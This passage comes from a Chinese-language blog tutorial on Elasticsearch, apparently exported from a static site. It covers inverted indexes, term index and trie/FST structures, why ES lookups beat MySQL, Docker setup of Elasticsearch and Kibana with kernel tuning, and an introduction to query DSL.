href=\"#8-3-3-Term-Index\" class=\"headerlink\" title=\"8.3.3 Term Index\"></a>8.3.3 Term Index</h3><p>B-Tree通过<strong>减少磁盘寻道次数</strong>来提高查询性能，Elasticsearch也是采用同样的思路</p>\n<p>但是磁盘的随机读操作仍然是非常昂贵的（一次random access大概需要10ms的时间）。</p>\n<p>所以尽量少的读磁盘，有必要把一些数据缓存到内存里。<strong>Elasticsearch直接通过内存查找term，不读磁盘</strong></p>\n<p>但是整个term dictionary本身又太大了，无法完整地放到内存里。</p>\n<p>于是就有了term index。term index有点像一本字典的大的章节表，或者说，像一本书的目录。</p>\n<p>比如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">A开头的term ……………. Xxx页  </span><br><span class=\"line\">C开头的term ……………. Xxx页  </span><br><span class=\"line\">E开头的term ……………. Xxx页  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>如果所有的term都是英文字符的话，可能这个term index就真的是26个英文字符表构成的了。 但是实际的情况是，term未必都是英文字符，term可以是任意的byte数组。</p>\n<p>而且26个英文字符也未必是每一个字符都有均等的term，比如x字符开头的term可能一个都没有，而s开头的term又特别多。</p>\n<p>实际的term index，的内部结构，类似一棵 trie 树：<br><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/33.png\"><br>例子是一个包含 “A”, “to”, “tea”, “ted”, “ten”, “i”, “in”, 和 “inn” 的 trie 树。 Term Dictionary与Term Index存储，Term Dictionary文件的后缀名为tim，Term Index文件的后缀名是tip。</p>\n<blockquote>\n<p>Lucene为词典做了一层前缀索引(Term Index)，这个索引在Lucene4.0以后采用的数据结构是FST (Finite State Transducer)，一种前缀树的变种，可以称之为前缀索引。</p>\n</blockquote>\n<p>这种数据结构占用空间很小，Lucene打开索引的时候将其全量装载到内存中，加快磁盘上词典查询速度的同时减少随机磁盘访问次数。</p>\n<h3 id=\"8-3-4-Trie树（前缀树，字典树）\"><a href=\"#8-3-4-Trie树（前缀树，字典树）\" class=\"headerlink\" title=\"8.3.4 Trie树（前缀树，字典树）\"></a>8.3.4 Trie树（前缀树，字典树）</h3><p>Trie，又经常叫前缀树，字典树等等。</p>\n<ul>\n<li><p>一个节点的所有子孙都有相同的前缀，也就是这个节点对应的字符串，而根节点对应空字符串。</p>\n</li>\n<li><p>一般情况下，不是所有的节点都有对应的值，只有叶子节点和部分内部节点所对应的键才有相关的值。</p>\n</li>\n</ul>\n<p>trie中的键通常是字符串，但也可以是其它的结构。它有很多变种，如后缀树，Radix Tree&#x2F;Trie，PATRICIA tree，以及bitwise版本的crit-bit tree。</p>\n<p>当然很多名字的意义其实有交叉。 在计算机科学中，trie，又称前缀树或字典树，是一种有序树，用于保存关联数组，其中的键通常是字 符串。</p>\n<p>与二叉查找树不同，键不是直接保存在节点中，而是由节点在树中的位置决定。</p>\n<p>trie的算法可以很容易地修改为处理其它结构的有序序列，比如一串数字或者形状的排列。</p>\n<p>这棵树不会包含所有的 term，它包含的是 term 的一些前缀。</p>\n<p>通过 term index 可以快速地定位到 term dictionary 的某个 offset，然后从这个位置再往后顺序查找。</p>\n<p>再加上一些压缩技术（搜索 Lucene Finite State Transducers）, term index 的尺寸可以只有所有term 的尺寸的<strong>几十分之一</strong>，使得用内存缓存整个 term index 变成可能。整体上来说就是这样的效果：<br><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/34.png\"></p>\n<h3 id=\"8-3-5-为什么ES检索比Mysql快\"><a href=\"#8-3-5-为什么ES检索比Mysql快\" class=\"headerlink\" title=\"8.3.5 为什么ES检索比Mysql快\"></a>8.3.5 为什么ES检索比Mysql快</h3><p>现在我们可以回答<strong>“为什么 Elasticsearch&#x2F;Lucene 检索可以比 Mysql 快”</strong> 了。 Mysql 只有 term dictionary 这一层，是以 b+tree 排序的方式存储在磁盘上的。</p>\n<p>检索一个 term 需要若干次（1-3次）的 random access 的磁盘操作。</p>\n<p>而ES&#x2F; Lucene 在 term dictionary 的基础上添加了 term index 来加速检索，term index 以类似前缀树的形式缓存在内存中。 从 term index 查到对应的 term dictionary 的 block 位置之后，再去磁盘上找 term，大大减少了磁盘的 random access 次数, 将3次 变成了1次。</p>\n","cover":"/img/liushui.png","cover_type":"img","excerpt":"","more":"<h1 id=\"ElasticSearch-从入门到工业级使用\"><a href=\"#ElasticSearch-从入门到工业级使用\" class=\"headerlink\" title=\"ElasticSearch 从入门到工业级使用\"></a>ElasticSearch 从入门到工业级使用</h1><h2 id=\"1-1-什么是全文检索\"><a href=\"#1-1-什么是全文检索\" class=\"headerlink\" title=\"1.1 什么是全文检索\"></a>1.1 什么是全文检索</h2><p>将非结构化数据中的一部分信息提取出来，重新组织，使其变得有一定结构，然后对此有一定结构的数据进行搜索，从而达到搜索相对较快的目的。这部分从非结构化数据中提取出的然后重新组织的信息，我们称之索引。</p>\n<p>例如：字典。字典的拼音表和部首检字表就相当于字典的索引，对每一个字的解释是非结构化的，如果字典没有音节表和部首检字表，在茫茫辞海中找一个字只能顺序扫描。</p>\n<p>然而字的某些信息可以提取出来进行结构化处理，比如读音，就比较结构化，分声母和韵母，分别只有几种可以一一列举，于是将读音拿出来按一定的顺序排列，每一项读音都指向此字的详细解释的页数。</p>\n<p>我们搜索时按结构化的拼音搜到读音，然后按其指向的页数，便可找到我们的非结构化数据——也即对字的解释。 这种先建立索引，再对索引进行搜索的过程就叫全文检索(Full-text Search)。</p>\n<p>虽然创建索引的过程也是非常耗时的，但是索引一旦创建就可以多次使用，全文检索主要处理的是查询，所以耗时间创建索引是值得的。<br><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/1.png\"><br>比如使用全文检索，所搜索“生化机”<br><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/2.png\"><br>（有可能是手抖打错了，本来是生化危机），但是期望需要出来右侧的 4条 记录</p>\n<p>有 4条 数据将每条数据进行词条拆分。</p>\n<p>如“生化危机电影”拆成：生化、危机、电影 关键词（拆分结果与策略算法有关）每个关键词将对应包含此关键词的数据 ID搜索的时候，直接匹配这些关键词，就能拿到包含关键词的数据这个过程就叫做全文检索。</p>\n<p>而词条拆分和词条对应的 ID 这个就是倒排索引的的基本原理</p>\n<p><strong>对比数据库的缺陷</strong></p>\n<p>mysql如果没有索引的情况下，共有100万条,按照之前的思路,其实就要扫描100万次，而且每次扫描,都需要匹配那个文本所有的字符，确认是否包含搜索的关键词，而且还不能将搜索词拆解开来进行检索<br><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/3.png\"><br><strong>全文检索使用场景</strong></p>\n<ul>\n<li><p>维基百科，类似百度百科，牙膏，牙膏的维基百科，全文检索，高亮，搜索推荐</p>\n</li>\n<li><p>The Guardian（国外新闻网站），类似搜狐新闻，用户行为日志（点击，浏览，收藏，评论）+社交网络数据（对某某新闻的相关看法），数据分析，给到每篇新闻文章的作者，让他知道他的文章的公众反馈（好，坏，热门，垃圾，鄙视，崇拜）</p>\n</li>\n<li><p>Stack Overflow（国外的程序异常讨论论坛），IT问题，程序的报错，提交上去，有人会跟你讨论和回答，全文检索，搜索相关问题和答案，程序报错了，就会将报错信息粘贴到里面去，搜索有没有对应的答案</p>\n</li>\n<li><p>GitHub（开源代码管理），搜索上千亿行代码（5）电商网站，检索商品</p>\n</li>\n<li><p>日志数据分析，logstash采集日志，ES进行复杂的数据分析（ELK技术，elasticsearch+logstash+kibana）</p>\n</li>\n<li><p>商品价格监控网站，用户设定某商品的价格阈值，当低于该阈值的时候，发送通知消息给用户，比如说订阅牙膏的监控，如果高露洁牙膏的家庭套装低于50块钱，就通知我，我就去买</p>\n</li>\n<li><p>BI系统，商业智能，Business Intelligence。比如说有个大型商场集团，BI，分析一下某某区域最近3年的用户消费金额的趋势以及用户群体的组成构成，产出相关的数张报表，**区，最近3年，每年消费金额呈现100%的增长，而且用户群体85%是高级白领，开一个新商场。ES执行数据分析和挖掘，Kibana进行数据可视化</p>\n</li>\n</ul>\n<h2 id=\"1-2-ES简介\"><a href=\"#1-2-ES简介\" class=\"headerlink\" title=\"1.2 ES简介\"></a>1.2 ES简介</h2><p>Elaticsearch，简称为es， es是一个开源的高扩展的分布式全文检索引擎，它可以近乎实时的存储、检索数据；本身扩展性很好，可以扩展到上百台服务器，处理PB级别的数据。</p>\n<p>es也使用Java开发并使用Lucene作为其核心来实现所有索引和搜索的功能，但是它的目的是通过简单的RESTful API来隐藏Lucene的复杂性，从而让全文搜索变得简单。</p>\n<p>Elasticsearch是面向文档(document oriented)的，这意味着它可以存储整个对象或文档(document)。然而它不仅仅是存储，还会索引(index)每个文档的内容使之可以被搜索。</p>\n<p>在Elasticsearch中，你可以对文档（而非成行成列的数据）进行索引、搜索、排序、过滤。Elasticsearch比传统关系型数据库如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Relational DB -&gt; Databases -&gt; Tables -&gt; Rows -&gt; Columns  </span><br><span class=\"line\">Elasticsearch -&gt; Indices   -&gt; Types  -&gt; Documents -&gt; Fields  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>Elasticsearch提供多种语言支持，其中Java的客户端为 Java REST Client 。</p>\n<p>而它又分成两种：高级和低级的。高级包含更多的功能，如果把高级比作MyBatis的话，那么低级就相当于JDBC，是基于Netty和Server通讯相关。</p>\n<h2 id=\"高级的-Client类似Mybatis是对于Low-Level的封装。1-3-ES基本概念\"><a href=\"#高级的-Client类似Mybatis是对于Low-Level的封装。1-3-ES基本概念\" class=\"headerlink\" title=\"高级的 Client类似Mybatis是对于Low Level的封装。1.3 ES基本概念\"></a>高级的 Client类似Mybatis是对于Low Level的封装。<br><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/4.png\"><br>1.3 ES基本概念</h2><ol>\n<li><strong>索引库</strong></li>\n</ol>\n<p>ElasticSearch将它的数据存储在一个或多个索引（index）中。</p>\n<p>用SQL领域的术语来类比，索引就像数据库，可以向索引写入文档或者从索引中读取文档，并通过ElasticSearch内部使用Lucene将数据写入索引或从索引中检索数据。</p>\n<p>Elastic Search使用倒排索引（Inverted Index）来做快速的全文搜索，这点与数据库不同，一般数据库 的索引，用B+Tree来实现。</p>\n<table>\n<thead>\n<tr>\n<th><strong>Relational DB</strong></th>\n<th><strong>Databases</strong></th>\n<th><strong>Tables</strong></th>\n<th><strong>表结构</strong></th>\n<th><strong>Rows</strong></th>\n<th><strong>Columns</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>ElasticSearch</td>\n<td>Indices</td>\n<td>Types</td>\n<td>映射mapping</td>\n<td>Documents</td>\n<td>Fields 字段</td>\n</tr>\n</tbody></table>\n<p>索引库就是存储索引的保存在磁盘上的一系列的文件。里面存储了建立好的索引信息以及文档对象。一个索引库相当于数据库中的一张表。<br><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/5.png\"><br>2.  <strong>document对象</strong></p>\n<p>获取原始内容的目的是为了索引，在索引前需要将原始内容创建成文档（Document），文档中包括一个一个的域（Field），域中存储内容。</p>\n<p>每个文档都有一个唯一的编号，就是文档id。</p>\n<p>document对象相当于表中的一条记录。</p>\n<p>文档（document）是ElasticSearch中的主要实体。</p>\n<p>对所有使用ElasticSearch的案例来说，他们最终都可以归结为对文档的搜索。</p>\n<p>文档由字段构成。</p>\n<p><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/6.png\"><br>3.  <strong>field对象</strong></p>\n<p>如果我们把document看做是数据库中一条记录的话，field相当于是记录中的字段。field是索引库中存储数据的最小单位。field的数据类型大致可以分为数值类型和文本类型，一般需要查询的字段都是文本类型的，field的还有如下属性：</p>\n<ul>\n<li><p>是否分词：是否对域的内容进行分词处理。前提是我们要对域的内容进行查询。</p>\n</li>\n<li><p>是否索引：将Field分析后的词或整个Field值进行索引，只有索引方可搜索到。比如：商品名称、商品简介分析后进行索引，订单号、身份证号不用分词但也要索引，这些将来都要作为查询条件。</p>\n</li>\n<li><p>是否存储：将Field值存储在文档中，存储在文档中的Field才可以从Document中获取。比如：商品名称、订单号，凡是将来要从Document中获取的Field都要存储。</p>\n</li>\n</ul>\n<ol start=\"4\">\n<li><strong>term对象</strong></li>\n</ol>\n<p>从文档对象中拆分出来的每个单词叫做一个Term，不同的域中拆分出来的相同的单词是不同的term。</p>\n<p>term中包含两部分一部分是文档的域名，另一部分是单词的内容。</p>\n<p>term是创建索引的关键词对象。</p>\n<ol start=\"8\">\n<li><strong>类型（type）</strong></li>\n</ol>\n<p>每个文档都有与之对应的类型（type）定义。</p>\n<p>这允许用户在一个索引中存储多种文档类型，并为不同文 档提供类型提供不同的映射。 type的版本迭代</p>\n<ul>\n<li><p>5.x及以前版本一个index有一个或者多个type</p>\n</li>\n<li><p>6.X版本一个index只有一个index</p>\n</li>\n<li><p>7.X版本移除了type，type相关的所有内容全部变成Deprecated，为了兼容升级和过渡，所有的7.X版本es数据写入后type字段都默认被置为_doc</p>\n</li>\n<li><p>8.X版本完全废弃type</p>\n</li>\n</ul>\n<ol start=\"9\">\n<li><strong>映射（mapping）</strong></li>\n</ol>\n<p>mapping是处理数据的方式和规则方面做一些限制，如某个字段的数据类型、默认值、分析器、是否被索引等等，这些都是映射里面可以设置的，其它就是处理es里面数据的一些使用规则设置也叫做映射，按着最优规则处理数据对性能提高很大，因此才需要建立映射，并且需要思考如何建立映射才能对性能更好。</p>\n<ol start=\"10\">\n<li><strong>分片（shards）</strong></li>\n</ol>\n<p>代表索引分片，es可以把一个完整的索引分成多个分片，这样的好处是可以把一个大的索引拆分成多个，分布到不同的节点上。构成分布式搜索。分片的数量只能在索引创建前指定，并且索引创建后不能更改。</p>\n<p>5.X默认不能通过配置文件定义分片 ES默认5:1 5个主分片，每个分片，1个副本分片</p>\n<ol start=\"11\">\n<li><strong>副本（replicas）</strong></li>\n</ol>\n<p>代表索引副本，es可以设置多个索引的副本，副本的作用：</p>\n<ul>\n<li><p>提高系统的容错性，当个某个节点某个分片损坏或丢失时可以从副本中恢复。</p>\n</li>\n<li><p>是提高es的查询效率，es会自动对搜索请求进行负载均衡。</p>\n</li>\n</ul>\n<ol start=\"12\">\n<li><strong>集群（cluster）</strong></li>\n</ol>\n<p>代表一个集群，集群中有多个节点（node），其中有一个为主节点，这个主节点是可以通过选举产生的，主从节点是对于集群内部来说的。es的一个概念就是去中心化，字面上理解就是无中心节点，这是对于集群外部来说的，因为从外部来看es集群，在逻辑上是个整体，你与任何一个节点的通信和与整个es集群通信是等价的。</p>\n<h1 id=\"2-安装和DSL的使用\"><a href=\"#2-安装和DSL的使用\" class=\"headerlink\" title=\"2 安装和DSL的使用\"></a>2 安装和DSL的使用</h1><h2 id=\"2-1-安装ES\"><a href=\"#2-1-安装ES\" class=\"headerlink\" title=\"2.1 安装ES\"></a>2.1 安装ES</h2><p>使用docker安装单点Elasticsearch，步骤如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">docker network create elastic  </span><br><span class=\"line\">docker pull docker.elastic.co/elasticsearch/elasticsearch:7.15.2  </span><br><span class=\"line\">docker run -di --name es --net elastic -p 192.168.56.181:9200:9200 -p 192.168.56.181:9300:9300 -e &quot;discovery.type=single-node&quot; docker.elastic.co/elasticsearch/elasticsearch:7.15.2  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>9200端口(Web管理平台端口)  9300(服务默认端口)</p>\n<p>浏览器输入地址访问：<code>http://192.168.56.181:9200/</code></p>\n<p><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/7.png\"><br>3.  <strong>系统参数配置</strong></p>\n<p>es发现重启启动失败了，这时什么原因呢？</p>\n<p>这与我们刚才修改的配置有关，因为elasticsearch在启动的时候会进行一些检查，比如最多打开的文件的个数以及虚拟内存区域数量等等，如果你放开了此配置，意味着需要打开更多的文件以及虚拟内存，所以我们还需要系统调优 修改vi &#x2F;etc&#x2F;security&#x2F;limits.conf ，追加内容 (nofile是单个进程允许打开的最大文件个数 soft nofile 是软限制 hard nofile是硬限制 )</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\\* soft nofile 65536  </span><br><span class=\"line\">\\* hard nofile 65536  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>修改vi &#x2F;etc&#x2F;sysctl.conf，追加内容 (限制一个进程可以拥有的VMA(虚拟内存区域)的数量 )</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">vm.max\\_map\\_count\\=655360  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>执行下面命令 修改内核参数马上生效</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">sysctl \\-p  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>重新启动虚拟机，再次启动容器，发现已经可以启动并远程访问</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">reboot  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"2-2-安装Kibana\"><a href=\"#2-2-安装Kibana\" class=\"headerlink\" title=\"2.2 安装Kibana\"></a>2.2 安装Kibana</h2><p>Kibana是一个针对Elasticsearch的开源分析及可视化平台，用来搜索、查看交互存储在Elasticsearch索引中的数据。使用Kibana，可以通过各种图表进行高级数据分析及展示。</p>\n<p>Kibana让海量数据更容易理解。它操作简单，基于浏览器的用户界面可以快速创建仪表板（dashboard）实时显示Elasticsearch查询动态。</p>\n<p>设置Kibana非常简单。</p>\n<p>无需编码或者额外的基础架构，几分钟内就可以完成Kibana安装并启动Elasticsearch索引监测。</p>\n<p>Query DSL是一个Java开源框架用于构建类型安全的SQL查询语句。</p>\n<p>采用API代替传统的拼接字符串来构造查询语句。</p>\n<p>目前QueryDSL支持的平台包括JPA，JDO，SQL，Java Collections，RDF，Lucene，Hibernate Search。elasticsearch提供了一整套基于JSON的DSL语言来定义查询。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">docker pull docker.elastic.co/kibana/kibana:7.15.2  </span><br><span class=\"line\">docker run -di --name kb --net elastic -p 192.168.56.181:5601:5601 -e &quot;ELASTICSEARCH\\_HOSTS=http://192.168.56.181:9200&quot; docker.elastic.co/kibana/kibana:7.15.2  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol>\n<li>拉取kibana镜像</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">docker pull docker.elastic.co/kibana/kibana:7.15.2  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>安装kibana容器</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">docker run -di --name kb --net elastic -p 192.168.56.181:5601:5601 -e &quot;ELASTICSEARCH\\_HOSTS=http://192.168.56.181:9200&quot; docker.elastic.co/kibana/kibana:7.15.2  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>修改配置文件</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">docker exec -it kb /bin/bash  </span><br><span class=\"line\">vi config/kibana.yml  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>好像不改也可以，因为上面docker启动有了ES地址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#修改elasticsarch.hosts: \\[ &quot;http://elasticsearch:9200&quot; \\]，如下：  </span><br><span class=\"line\">elasticsearch.hosts: \\[ &quot;http://192.168.56.181:9200&quot; \\]  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"2-3通过脚本一键启动ES\"><a href=\"#2-3通过脚本一键启动ES\" class=\"headerlink\" title=\"2.3通过脚本一键启动ES\"></a>2.3通过脚本一键启动ES</h2><p>通过提供的脚本，和配置文件，可以一键启动ES</p>\n<p>这个非常的容易，非常的轻量级。 具体请参见视频。</p>\n<p><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/8.png\"><br>启动完之后的效果</p>\n<p><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/9.png\"><br>接下来，可以访问es</p>\n<p><a href=\"http://cdh1:9200/\">http://cdh1:9200</a></p>\n<p><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/10.png\"><br>接下来，可以访问 Kibana</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">默认的地址     http://cdh1:5601               </span><br><span class=\"line\">  </span><br><span class=\"line\">的一键环境地址     http://cdh1:5601             </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"2-4使用-DSL-操作ES\"><a href=\"#2-4使用-DSL-操作ES\" class=\"headerlink\" title=\"2.4使用 DSL 操作ES\"></a><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/11.png\"><br>2.4使用 DSL 操作ES</h2><p>在 Kibana的开发工具界面，可以执行 DSL 去进行ES的查询。</p>\n<p><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/12.png\"><br>es开发，常常需要用到DSL语法去定义好 es的查询语句。</p>\n<p>就像 myql开发，需要提前定义好 sql语句，并进行sql 的执行和测试一样。</p>\n<h3 id=\"2-4-1DSL-定义基本介绍\"><a href=\"#2-4-1DSL-定义基本介绍\" class=\"headerlink\" title=\"2.4.1DSL 定义基本介绍\"></a>2.4.1DSL 定义基本介绍</h3><h5 id=\"DSL（Domain-Specific-Language），一种特定领域的查询语言，用于构建复杂的查询和聚合操作。\"><a href=\"#DSL（Domain-Specific-Language），一种特定领域的查询语言，用于构建复杂的查询和聚合操作。\" class=\"headerlink\" title=\"DSL（Domain Specific Language），一种特定领域的查询语言，用于构建复杂的查询和聚合操作。\"></a>DSL（Domain Specific Language），一种特定领域的查询语言，用于构建复杂的查询和聚合操作。</h5><p>在Elasticsearch中，可用DSL语法来定义查询和过滤条件，以及执行聚合操作。</p>\n<p>DSL语法 具有JSON格式，因此它非常易于阅读和编写。</p>\n<h3 id=\"2-4-2DSL-定义语法说明\"><a href=\"#2-4-2DSL-定义语法说明\" class=\"headerlink\" title=\"2.4.2DSL 定义语法说明\"></a>2.4.2DSL 定义语法说明</h3><h6 id=\"（1）关键字-Keywords\"><a href=\"#（1）关键字-Keywords\" class=\"headerlink\" title=\"（1）关键字(Keywords)\"></a>（1）关键字(Keywords)</h6><ul>\n<li><p>DSL通常会定义一组关键字，这些关键字具有特殊含义，并在DSL中起到关键作用。关键字通常不能用作标识符或变量名。</p>\n</li>\n<li><p>示例：在一个简单的数学表达式DSL中，可能会定义关键字如”add”、”subtract”等来表示加法和减法操作。</p>\n</li>\n</ul>\n<h6 id=\"（2）标识符-Identifiers\"><a href=\"#（2）标识符-Identifiers\" class=\"headerlink\" title=\"（2）标识符(Identifiers)\"></a>（2）标识符(Identifiers)</h6><ul>\n<li><p>标识符是用来表示变量名、函数名或其他用户定义的名称。它们需要遵循特定的命名规则，如大小写敏感、不包含特殊字符等。</p>\n</li>\n<li><p>示例：在一个配置文件DSL中，可以使用标识符来表示不同的配置项，如”username”、”password”等。</p>\n</li>\n</ul>\n<h6 id=\"（3）表达式-Expressions\"><a href=\"#（3）表达式-Expressions\" class=\"headerlink\" title=\"（3）表达式(Expressions)\"></a>（3）表达式(Expressions)</h6><ul>\n<li><p>表达式是DSL中最基本的构建块，用于计算或产生某个值。表达式可以包括变量、常量、运算符和函数调用。</p>\n</li>\n<li><p>示例：在一个数学表达式DSL中，可以将”2 + 3”作为一个表达式，计算结果为5。</p>\n</li>\n</ul>\n<h6 id=\"（4）运算符-Operators\"><a href=\"#（4）运算符-Operators\" class=\"headerlink\" title=\"（4）运算符(Operators)\"></a>（4）运算符(Operators)</h6><ul>\n<li><p>运算符用于执行各种操作，例如算术运算、逻辑运算、比较运算等。DSL中的运算符根据所涉及的领域和需求而定。</p>\n</li>\n<li><p>示例：在一个布尔表达式DSL中，可以定义逻辑运算符如”and”、”or”用于连接多个条件。</p>\n</li>\n</ul>\n<h6 id=\"（5）函数调用-Function-Calls\"><a href=\"#（5）函数调用-Function-Calls\" class=\"headerlink\" title=\"（5）函数调用(Function Calls)\"></a>（5）函数调用(Function Calls)</h6><ul>\n<li><p>DSL可以支持函数调用，允许用户使用预定义或自定义的函数来完成特定的任务。函数调用通常由函数名称和传递给函数的参数组成。</p>\n</li>\n<li><p>示例：在一个日期处理DSL中，可以定义函数”formatDate(date, format)”，其中”date”是日期值，”format”是日期格式字符串。</p>\n</li>\n</ul>\n<h6 id=\"（6）控制流-Control-Flow\"><a href=\"#（6）控制流-Control-Flow\" class=\"headerlink\" title=\"（6）控制流(Control Flow)\"></a>（6）控制流(Control Flow)</h6><ul>\n<li><p>控制流语句用于控制程序的执行流程，例如条件语句(if-else)和循环语句(while、for)等。DSL可以支持特定的控制流语句来满足领域特定需求。</p>\n</li>\n<li><p>示例：在一个工作流程DSL中，可以使用条件语句来判断某个条件是否满足并执行相应的操作。</p>\n</li>\n</ul>\n<h6 id=\"（7）注释-Comments\"><a href=\"#（7）注释-Comments\" class=\"headerlink\" title=\"（7）注释(Comments)\"></a>（7）注释(Comments)</h6><ul>\n<li><p>注释用于向DSL代码添加说明性文本，以便开发人员理解和维护代码。注释通常不会被编译或执行，仅用于阅读目的。</p>\n</li>\n<li><p>示例：在DSL中，可以使用双斜杠(&#x2F;&#x2F;)或特定的注释标记来添加注释，如：“&#x2F;&#x2F; 这是一个示例注释”。</p>\n</li>\n</ul>\n<h3 id=\"2-4-3DSL常见语法\"><a href=\"#2-4-3DSL常见语法\" class=\"headerlink\" title=\"2.4.3DSL常见语法\"></a>2.4.3DSL常见语法</h3><blockquote>\n<p>文章实在太长， 这里省略了500字+， 省略的内容请参见的免费电子书 PDF版本《ES学习圣经：从0到1, 精通 ElasticSearch 工业级使用 》</p>\n</blockquote>\n<h1 id=\"3-ES-的分词器\"><a href=\"#3-ES-的分词器\" class=\"headerlink\" title=\"3 ES 的分词器\"></a>3 ES 的分词器</h1><h2 id=\"3-1-倒排索引\"><a href=\"#3-1-倒排索引\" class=\"headerlink\" title=\"3.1 倒排索引\"></a>3.1 倒排索引</h2><p><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/13.png\"><br>如上图</p>\n<ul>\n<li><p>左边的是正排索引，通过文档的id如查找文档的内容</p>\n</li>\n<li><p>右边的是倒排索引，通过单词统计次数以及文档的位置，</p>\n</li>\n</ul>\n<p>如Elasticsearch出现的次数为3，在id&#x3D;1，id&#x3D;2，id&#x3D;3都出现过，且位置分别为1，0，0</p>\n<h2 id=\"3-2-默认分词器\"><a href=\"#3-2-默认分词器\" class=\"headerlink\" title=\"3.2 默认分词器\"></a>3.2 默认分词器</h2><p>默认分词器对于英文分词的效果如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">POST /\\_analyze  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;text&quot;: &quot;You can use Elasticsearch to store, search, and manage data&quot;,  </span><br><span class=\"line\">  &quot;analyzer&quot;: &quot;standard&quot;  </span><br><span class=\"line\">&#125;  